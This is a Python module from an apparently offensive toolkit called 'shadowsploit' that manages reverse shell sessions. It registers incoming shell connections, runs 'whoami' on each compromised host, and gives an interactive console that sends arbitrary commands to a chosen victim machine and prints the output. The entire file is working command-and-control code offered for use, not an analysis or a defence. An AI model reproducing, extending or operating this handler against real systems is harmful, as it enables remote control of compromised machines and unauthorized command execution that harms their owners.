# shadowsploit/core/session_handler.py
import socket

sessions = {}
session_counter = 0

def add_session(conn, addr):
    """Register a new reverse shell session"""
    global session_counter
    session_counter += 1
    session_id = session_counter
    sessions[session_id] = conn
    print(f"[+] New session {session_id} opened from {addr[0]}:{addr[1]}")
    return session_id

def list_sessions():
    """Show all active sessions"""
    if not sessions:
        print("[-] No sessions here for now")
        return
    print("\nActive Sessions:")
    for sid, conn in sessions.items():
        try:
            conn.send(b"whoami\n")
            user = conn.recv(1024).decode(errors="ignore").strip()
        except:
            user = "unknown / lost"
        print(f"  {sid}: {user}")
    print("")

def interact_session(session_id):
    """Interact with a chosen session"""
    if session_id not in sessions:
        print("[-] Invalid session ID")
        return
    conn = sessions[session_id]
    print(f"[*] Interacting with session {session_id} (type 'exit' to return to scconsole)\n")
    while True:
        cmd = input(f"sc(session {session_id})> ")
        if cmd.strip().lower() in ["exit", "quit"]:
            print("[*] Returning to scconsole...")
            break
        try:
            conn.send(cmd.encode() + b"\n")
            output = conn.recv(4096).decode(errors="ignore")
            print(output)
        except:
            print("[!] Lost connection to session")
            del sessions[session_id]
            break

def kill_session(session_id):
    """Close a session and remove it"""
    if session_id in sessions:
        try:
            sessions[session_id].close()
        except:
            pass
        del sessions[session_id]
        print(f"[*] Session {session_id} closed.")
    else:
        print("[-] Invalid session ID")
